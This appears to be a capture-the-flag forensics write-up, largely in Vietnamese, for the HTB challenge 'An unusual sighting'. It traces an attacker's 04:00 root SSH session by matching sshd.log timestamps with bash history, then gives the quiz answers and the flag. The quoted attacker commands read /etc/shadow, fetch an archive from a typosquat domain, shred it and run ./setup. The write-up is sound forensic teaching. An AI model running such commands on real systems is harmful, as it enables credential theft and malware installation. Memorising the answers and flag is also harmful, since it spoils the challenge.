# An unusual sighting

## 1. Tổng quan / Overview

- **Challenge:** An unusual sighting (HTB Try Out — Forensics, mức rất dễ)
- **File cung cấp:** `forensics_an_unusual_sighting.zip` gồm 2 artifact văn bản:
  - `bash_history.txt` — lịch sử lệnh shell (của user root) kèm timestamp.
  - `sshd.log` — log kết nối SSH (thành công/thất bại) kèm IP nguồn, user, thời gian.
- **Bối cảnh:** Đội dev đang refactor CMS cho "The Fray" thì phát hiện công việc
  biến mất bí ẩn. Nhiệm vụ: dựa vào 2 file log, tìm ra kẻ gây ra sự việc ("perpetrator").

## 2. Triage

- Giải nén zip: `Expand-Archive` → 2 file text sạch, không có dữ liệu nhị phân/ẩn
  (quét non-ASCII, ký tự điều khiển, khoảng trắng thừa, `HTB{` đều không thấy).
- `sshd.log`: 19 phiên đăng nhập thành công, hầu hết là user `softdev` làm việc
  ban ngày từ dải IP `100.x / 101.x / 102.x` (kiểu Tailscale/VPN của đội).
- `bash_history.txt`: 85 lệnh; phần lớn là công việc dev hợp lệ (venv, pip,
  `server.py`, `git`, `nvim`).
- Dấu hiệu bất thường đầu tiên: đúng **một** phiên root lúc **04:00 sáng**
  2024-02-19 từ IP **2.67.182.119** (địa chỉ public), kèm một khối lệnh tấn công.

## 3. Phân tích / Analysis

**Khối lệnh đáng ngờ duy nhất trong bash_history (2024-02-19 04:00–04:14):**

```
whoami / uname -a / cat /etc/passwd / cat /etc/shadow / ps faux
wget https://gnu-packages.com/prebuilts/iproute2/latest.tar.gz -O /tmp/latest_iproute.tar.gz
tar xvf latest.tar.gz
shred -zu latest.tar.gz
./setup
```

- Trinh sát hệ thống (`/etc/shadow` — đọc hash mật khẩu).
- Tải file từ domain **gnu-packages.com** — domain giả mạo (typosquat) của
  gnu.org, đóng giả "prebuilt iproute2" (kiểu tấn công chuỗi cung ứng).
- `shred -zu` xóa archive để tiêu hủy bằng chứng, sau đó chạy `./setup`
  (dropper).

**Đối chiếu sshd.log — phiên SSH trùng khớp thời gian:**

```
[2024-02-19 04:00:14] Accepted password for root from 2.67.182.119 port 60071 ssh2
[2024-02-19 04:00:14] Starting session: shell on pts/2 for root from 2.67.182.119 port 60071
[2024-02-19 04:38:17] Disconnected from user root 2.67.182.119 port 60071
```

- Lệnh đầu tiên của attacker (`04:00:18`) chỉ cách lúc phiên SSH được chấp nhận
  (`04:00:14`) **4 giây** — cùng một phiên.
- Script `solve/solve.py` xác minh: **chỉ đúng một** phiên SSH có cửa sổ thời gian
  chứa toàn bộ khối lệnh ác ý → IP nguồn `2.67.182.119`.
- Các phiên còn lại (user `softdev`, giờ làm việc, fingerprint SSH cố định theo
  từng người) đều khớp với lệnh dev hợp lệ ở cùng timestamp → loại trừ.

## 4. Exploit

Challenge yêu cầu **kết nối vào instance Docker-spawn** (`nc 154.57.164.69 32684`)
và trả lời một chuỗi câu hỏi dựa trên phân tích log. Trình tự câu hỏi / đáp án:

| # | Câu hỏi | Trả lời | Căn cứ |
|---|---------|---------|--------|
| 1 | IP Address and Port of the SSH Server (IP:PORT) | `100.107.36.130:2221` | dòng `Connection from ... on 100.107.36.130 port 2221` |
| 2 | What time is the first successful Login | `2024-02-13 11:29:50` | phiên `Accepted password` đầu tiên |
| 3 | What is the time of the unusual Login | `2024-02-19 04:00:14` | phiên root bất thường lúc rạng sáng |
| 4 | What is the Fingerprint of the attacker's public key | `OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4` | dòng `Failed publickey` của phiên attacker |
| 5 | What is the first command the attacker executed after logging in | `whoami` | lệnh đầu khối ác ý `04:00:18` |
| 6 | What is the final command the attacker executed before logging out | `./setup` | lệnh cuối khối ác ý `04:14:02` |

Toàn bộ đáp án suy ra từ `bash_history.txt` + `sshd.log`; sau 6 câu đúng, server
trả flag. Kịch bản dùng `solve/evidence/probe.py` (socket) để trả lời tuần tự.

## 5. Flag

```
HTB{4n_unusual_s1ght1ng_1n_SSH_l0gs!}
```

> Lưu ý: flag **không** phải là IP attacker (`HTB{2.67.182.119}`) như suy luận
> offline ban đầu — flag thật chỉ lấy được từ chuỗi hỏi/đáp tương tác trên remote.

## 6. Bài học / Lessons

- **Log SSH + bash history là nguồn bằng chứng quan trọng:** nối khớp theo cửa sổ
  thời gian (timestamp correlation) giúp quy một khối lệnh về đúng phiên kết nối.
- **Nhận diện IP bất thường:** đội dùng VPN (dải `100.x/101.x/102.x`); một IP
  public lạ đăng nhập `root` lúc rạng sáng là "unusual sighting".
- **Dấu hiệu tấn công chuỗi cung ứng:** domain typosquat (gnu-packages.com),
  tải "prebuilt" tool phổ biến, chạy `./setup`, rồi `shred` xóa bằng chứng.
- **Đừng tin tưởng mọi thứ trong history:** `cat /etc/shadow`, `wget` domain lạ,
  `shred` là chuỗi hành vi điển hình của attacker.
- **Challenge tương tác (quiz-remote):** flag thật chỉ hiện sau khi trả lời đúng
  chuỗi câu hỏi trên live instance — suy luận offline giúp dựng đáp án, nhưng
  phải gửi lên server mới nhận được flag.
